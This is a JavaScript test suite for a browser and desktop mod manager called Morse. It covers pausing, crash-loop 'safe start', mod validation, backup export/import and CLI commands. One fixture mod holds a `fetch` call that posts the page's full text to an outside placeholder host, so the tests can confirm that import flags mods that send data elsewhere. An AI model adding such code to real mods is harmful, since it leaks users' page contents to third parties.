// Pause state, safe start, export/import and the shared control host
// (core/control.js, core/backup.js, core/control-host.js), and the desktop
// CLI commands in daemon/control.js against a scratch MORSE_HOME.
import "./helpers/home.js";
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, readFile, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import {
  normalizeControl, controlKey, isPaused, pauseInfo, setPause,
  safeKey, safeBoot, safeApplied, safeAlive, safeForgive, SAFE_WINDOW, SAFE_SPAN, SAFE_MAX_RECORDS,
} from "../core/control.js";
import { exportBundle, parseImport, prepareInstall, backupFilename } from "../core/backup.js";
import { controlHandler } from "../core/control-host.js";
import { createMod, encodeShare, validateMod, modMatches } from "../core/mod.js";

const NEWS = { url: "https://news.example/today", app: null };
const MAIL = { url: "https://mail.example/inbox", app: null };
const SPOTIFY = { url: "https://open.spotify.com/", app: "spotify" };

test("pause keys: desktop apps by id, websites by host", () => {
  assert.equal(controlKey(NEWS), "news.example");
  assert.equal(controlKey(SPOTIFY), "spotify");
  assert.equal(controlKey({ url: "file:///tmp/a.html" }), "file");
  assert.equal(controlKey({ url: "not a url" }), "*");
});

test("pause one site, everywhere, and resume", () => {
  let s = normalizeControl(null);
  assert.equal(isPaused(s, NEWS), false);
  s = setPause(s, { key: "news.example", on: true });
  assert.equal(isPaused(s, NEWS), true);
  assert.equal(isPaused(s, MAIL), false, "other sites keep running");
  assert.deepEqual(pauseInfo(s, NEWS), { all: false, here: true, key: "news.example", sites: ["news.example"] });
  s = setPause(s, { all: true });
  assert.equal(isPaused(s, MAIL), true);
  assert.equal(isPaused(s, SPOTIFY), true);
  s = setPause(s, { all: false });
  assert.equal(isPaused(s, MAIL), false);
  assert.equal(isPaused(s, NEWS), true, "resuming everywhere keeps a site's own pause");
  s = setPause(s, { key: "news.example", on: false });
  assert.equal(isPaused(s, NEWS), false);
  assert.deepEqual(s.pause.sites, {});
});

test("normalizeControl drops junk and never throws", () => {
  for (const junk of [undefined, 5, "x", [], { pause: 3 }, { pause: { all: "yes", sites: { "": 1, a: 0, b: true } }, safe: { k: 3 } }]) {
    const s = normalizeControl(junk);
    assert.equal(typeof s.pause.all, "boolean");
    assert.equal(typeof s.pause.sites, "object");
  }
  const s = normalizeControl({ pause: { all: "yes", sites: { "": 1, a: 0, b: true } } });
  assert.equal(s.pause.all, false, "only true pauses");
  assert.deepEqual(Object.keys(s.pause.sites), ["b"]);
});

// A tab that loads, runs a mod, then dies `life` ms later.
function load(s, key, t, mods, life) {
  const b = safeBoot(s, key, t);
  let st = b.state;
  for (const m of mods) st = safeApplied(st, key, m, t + 100);
  st = safeAlive(st, key, t + 100 + life);
  return { state: st, suspect: b.suspect };
}
const LOOPY = { id: "loopy", title: "Loopy", updated: "2026-10-02", js: true };
const CALM = { id: "calm", title: "Calm", updated: "2026-10-01", js: true };
const STYLE = { id: "style", title: "Style", updated: "2026-10-03", js: false };

test("safe start: a page that keeps dying right after a mod runs holds that mod back", () => {
  const key = safeKey(NEWS, "tab1");
  let s = normalizeControl({}), r;
  r = load(s, key, 0, [CALM, LOOPY, STYLE], 900); s = r.state;
  assert.equal(r.suspect, null, "first load");
  r = load(s, key, 2000, [CALM, LOOPY, STYLE], 900); s = r.state;
  assert.equal(r.suspect, null, "one strike is not enough");
  r = load(s, key, 4000, [CALM, LOOPY, STYLE], 900); s = r.state;
  assert.equal(r.suspect, null, "nor two");
  r = load(s, key, 6000, [CALM, LOOPY, STYLE], 900); s = r.state;
  assert.deepEqual(r.suspect, { id: "loopy", title: "Loopy", strikes: 3 }, "blames the newest mod with code, not the CSS-only one");
  // Still held on the next load until the person decides.
  r = load(s, key, 8000, [CALM, STYLE], 20000); s = r.state;
  assert.equal(r.suspect?.id, "loopy");
  s = safeForgive(s, key);
  assert.equal(safeBoot(s, key, 30000).suspect, null, "forgiven");
});

test("safe start: normal browsing never trips it", () => {
  const key = safeKey(NEWS, "tab1");
  let s = normalizeControl({}), r;
  // Long visits, quick reload once, long again.
  for (const [t, life] of [[0, 60000], [70000, 900], [72000, 60000], [140000, 900], [142000, 30000], [180000, 0]]) {
    r = load(s, key, t, [LOOPY], life); s = r.state;
    assert.equal(r.suspect, null, `at ${t}`);
  }
  // Loads with no mods running are not evidence.
  s = normalizeControl({});
  for (let t = 0; t < 10000; t += 1000) { r = load(s, key, t, [], 100); s = r.state; assert.equal(r.suspect, null); }
  // A reload long after the mod ran (the tab sat in the background, never seen alive again) doesn't count.
  s = normalizeControl({});
  for (const t of [0, SAFE_SPAN + 1000, 2 * SAFE_SPAN + 2000]) { r = load(s, key, t, [LOOPY], 100); s = r.state; }
  assert.equal(r.suspect, null);
});

test("safe start: other tabs of the same site don't count against each other", () => {
  let s = normalizeControl({}), r;
  // Restoring a session: five tabs of one site open within a second.
  for (let i = 0; i < 5; i++) { r = load(s, safeKey(NEWS, `tab${i}`), i * 200, [LOOPY], 100000); s = r.state; assert.equal(r.suspect, null); }
});

test("safe start: a suspect that later runs fine is let go, and records stay bounded", () => {
  const key = safeKey(NEWS, "t");
  let s = normalizeControl({});
  for (const t of [0, 2000, 4000, 6000]) s = load(s, key, t, [LOOPY], 500).state;
  const b = safeBoot(s, key, 8000);
  assert.equal(b.suspect?.id, "loopy");
  s = safeApplied(b.state, key, LOOPY, 8100); // turned back on by hand
  s = safeAlive(s, key, 8100 + SAFE_WINDOW + 1);
  assert.equal(s.safe[key].suspect, null);
  for (let i = 0; i < SAFE_MAX_RECORDS + 30; i++) s = safeBoot(s, safeKey(NEWS, `x${i}`), 10000 + i).state;
  assert.equal(Object.keys(s.safe).length, SAFE_MAX_RECORDS);
});

const mod = (title, extra = {}) => ({ ...createMod({ title, prompt: `make ${title}`, css: "a{}", js: "", url: "https://news.example/" }), ...extra });

test("a mod must say where it runs; a broken one is skipped, never thrown on", () => {
  const ok = createMod({ title: "x", prompt: "x", css: "a{}", url: "https://news.example/" });
  assert.equal(validateMod(ok), ok);
  assert.ok(validateMod({ ...ok, match: { hosts: ["a.example"], app: "spotify" } }));
  assert.ok(validateMod({ ...ok, match: { hosts: ["*"] } }), "app may be left out");
  for (const match of [undefined, null, "x", [], {}, { hosts: [] }, { hosts: [1] }, { hosts: [null] }, { hosts: [""] }, { hosts: "a" }, { hosts: ["a"], app: 3 }, { hosts: ["a"], app: {} }]) {
    assert.throws(() => validateMod({ ...ok, match }), /doesn't say where it runs/, JSON.stringify(match));
  }
  const broken = [{ ...ok, id: "b1", match: { hosts: [1] } }, { ...ok, id: "b2", match: { hosts: [null] } }, { ...ok, id: "b3", match: "x" }, null, 7];
  const where = { url: "https://news.example/", app: null };
  assert.deepEqual([...broken, ok].filter(m => modMatches(m, where)).map(m => m.id), [ok.id], "the good mod still loads");
});

test("export bundle and import: backup, single mod, share link, junk", async () => {
  const a = mod("one"), b = mod("two", { enabled: false });
  const bundle = exportBundle([a, b], new Date("2026-10-24T10:00:00Z"));
  assert.equal(bundle.morse, "morse-backup");
  assert.equal(bundle.count, 2);
  assert.equal(backupFilename(new Date("2026-10-24T10:00:00Z")), "morse-mods-2026-10-24.json");
  const back = await parseImport(JSON.stringify(bundle));
  assert.equal(back.kind, "backup");
  assert.deepEqual(back.mods.map(m => m.title), ["one", "two"]);
  const single = await parseImport(JSON.stringify(a));
  assert.equal(single.kind, "mod");
  const link = await parseImport(await encodeShare(a));
  assert.equal(link.kind, "link");
  assert.equal(link.mods[0].title, "one");
  const mixed = await parseImport(JSON.stringify({ mods: [a, { nope: 1 }] }));
  assert.equal(mixed.mods.length, 1);
  assert.match(mixed.errors[0], /Item 2: This isn't a Morse mod/);
  await assert.rejects(parseImport("hello"), /isn't a Morse share link/);
  await assert.rejects(parseImport(""), /Paste a Morse share link/);
  await assert.rejects(parseImport("{}"), /isn't a Morse mod/);
});

test("installing marks where a mod came from; a backup keeps on/off", () => {
  const now = new Date("2026-10-24T10:00:00Z");
  const fromLink = prepareInstall(mod("one", { enabled: false }), { kind: "link", now });
  assert.equal(fromLink.enabled, true);
  assert.equal(fromLink.imported, true);
  assert.equal(fromLink.importedFrom, "link");
  assert.equal(fromLink.importedAt, now.toISOString());
  assert.equal(prepareInstall(mod("x"), { kind: "mod" }).importedFrom, "file");
  const restored = prepareInstall(mod("two", { enabled: false }), { kind: "backup", now });
  assert.equal(restored.enabled, false);
  assert.equal(restored.importedFrom, "backup");
  const shared = prepareInstall(mod("three", { imported: true, importedFrom: "link", importedAt: "2026-01-01T00:00:00Z" }), { kind: "backup", now });
  assert.equal(shared.importedFrom, "link", "a restored shared mod still says it was shared");
  assert.equal(shared.importedAt, "2026-01-01T00:00:00Z");
});

function memoryHost() {
  const db = { control: {}, mods: {}, pauses: [] };
  let t = 0;
  const handle = controlHandler({
    load: async () => structuredClone(db.control),
    save: async s => { db.control = structuredClone(s); },
    listMods: async () => Object.values(db.mods),
    putMods: async list => { for (const m of list) db.mods[m.id] = m; },
    onPause: p => db.pauses.push(p),
  }, () => t);
  return { db, handle, at: v => (t = v) };
}

test("control host: pause broadcasts once per change, requests are serialized", async () => {
  const h = memoryHost();
  const r = await h.handle({ type: "control.pause", scope: "site", on: true }, NEWS);
  assert.equal(r.info.here, true);
  await h.handle({ type: "control.pause", scope: "site", on: true }, NEWS);
  assert.equal(h.db.pauses.length, 1, "no broadcast when nothing changed");
  assert.equal((await h.handle({ type: "control.get" }, NEWS)).paused, true);
  assert.equal((await h.handle({ type: "control.get" }, MAIL)).paused, false);
  await h.handle({ type: "control.pause", scope: "all", on: true }, MAIL);
  assert.equal((await h.handle({ type: "control.get" }, MAIL)).paused, true);
  // 20 tabs reporting at once lose nothing.
  await Promise.all(Array.from({ length: 20 }, (_, i) => h.handle({ type: "control.boot", tab: `t${i}` }, MAIL)));
  assert.equal(Object.keys(h.db.control.safe).length, 20);
});

test("control host: safe start over requests, install and export", async () => {
  const h = memoryHost();
  const req = (type, extra = {}) => h.handle({ type, tab: "a", ...extra }, NEWS);
  for (const t of [0, 3000, 6000, 9000]) {
    h.at(t);
    const boot = await req("control.boot");
    if (t < 9000) assert.equal(boot.suspect, null);
    else assert.equal(boot.suspect.id, "loopy");
    h.at(t + 50); await req("control.applied", { mod: LOOPY });
    h.at(t + 1500); await req("control.alive");
  }
  await req("control.forgive");
  h.at(12000);
  assert.equal((await req("control.boot")).suspect, null);

  const link = await encodeShare(mod("shared", { author: "Ana" }));
  const preview = await req("mods.preview", { source: link });
  assert.equal(Object.keys(h.db.mods).length, 0, "preview saves nothing");
  const saved = await req("control.install", { mods: preview.mods, kind: preview.kind });
  assert.equal(saved[0].importedFrom, "link");
  assert.equal(h.db.mods[saved[0].id].author, "Ana");
  const exp = await req("control.exportAll");
  assert.equal(exp.count, 1);
  assert.equal(JSON.parse(exp.content).mods[0].title, "shared");
  await assert.rejects(req("control.install", { mods: [] }), /Nothing to install/);
});

test("CLI: morse pause / resume, export --all, import", async () => {
  const home = await mkdtemp(path.join(os.tmpdir(), "morse-ctl-"));
  process.env.MORSE_HOME = home;
  // store.js reads MORSE_HOME when first imported; nothing else in this file imports it.
  const ctl = await import("../daemon/control.js");
  const store = await import("../daemon/store.js");
  assert.equal(ctl.CONTROL_FILE, path.join(home, "control.json"));
  const logs = [];
  const log = console.log;
  console.log = (...a) => logs.push(a.join(" ").replace(/\x1b\[\d+m/g, ""));
  try {
    await ctl.pauseCli({ _: [] });
    assert.equal((await ctl.loadControl()).pause.all, true);
    assert.match(logs.join("\n"), /Paused Morse everywhere/);
    await ctl.pauseCli({ _: ["news.example"] });
    await ctl.resumeCli({ _: [] });
    let s = await ctl.loadControl();
    assert.equal(s.pause.all, false);
    assert.ok(s.pause.sites["news.example"], "a site's own pause stays");
    assert.match(logs.at(-1), /Paused on: news\.example/);
    await ctl.resumeCli({ _: ["news.example"] });
    assert.deepEqual((await ctl.loadControl()).pause.sites, {});

    // The connector's own requests go to the same file.
    await ctl.handleControl({ type: "control.pause", scope: "site", on: true }, { url: "x", app: "spotify" });
    assert.ok((await ctl.loadControl()).pause.sites.spotify);

    // A broken mod file on disk doesn't stop the others from loading.
    await writeFile(path.join(home, "mods", "broken.json"), JSON.stringify({ ...mod("broken"), id: "broken", match: { hosts: [1] } }));
    await store.saveMod(mod("good"));
    assert.deepEqual((await store.modsFor({ url: "https://news.example/", app: null })).map(m => m.title), ["good"]);
    for (const m of await store.listMods()) await store.deleteMod(m.id);

    await store.saveMod(mod("one"));
    await store.saveMod(mod("two", { js: "fetch('https://x.example', { body: document.body.innerText })" }));
    const out = path.join(home, "backup.json");
    await ctl.exportAllCli({ _: [], out });
    const bundle = JSON.parse(await readFile(out, "utf8"));
    assert.equal(bundle.count, 2);

    // Restore into an empty store: refuses without --yes when nobody can be asked, shows what it does.
    for (const m of await store.listMods()) await store.deleteMod(m.id);
    logs.length = 0;
    if (!process.stdin.isTTY) await assert.rejects(ctl.importCli({ _: [out] }), /--yes/);
    assert.match(logs.join("\n"), /Sends data to another website/);
    assert.match(logs.join("\n"), /Note: This mod can send information/);
    assert.equal((await store.listMods()).length, 0, "nothing installed before saying yes");
    const saved = await ctl.importCli({ _: [out], yes: true });
    assert.equal(saved.length, 2);
    assert.deepEqual((await store.listMods()).map(m => m.importedFrom), ["backup", "backup"]);
    logs.length = 0;
    await ctl.codeCli({ _: [saved.find(m => m.title === "two").id] });
    assert.match(logs.join("\n"), /Restored from a backup/);
    assert.match(logs.join("\n"), /fetch\('https:\/\/x\.example'/);
    await writeFile(path.join(home, "junk.json"), "{}");
    await assert.rejects(ctl.importCli({ _: [path.join(home, "junk.json")], yes: true }), /isn't a Morse mod/);
  } finally {
    console.log = log;
  }
});
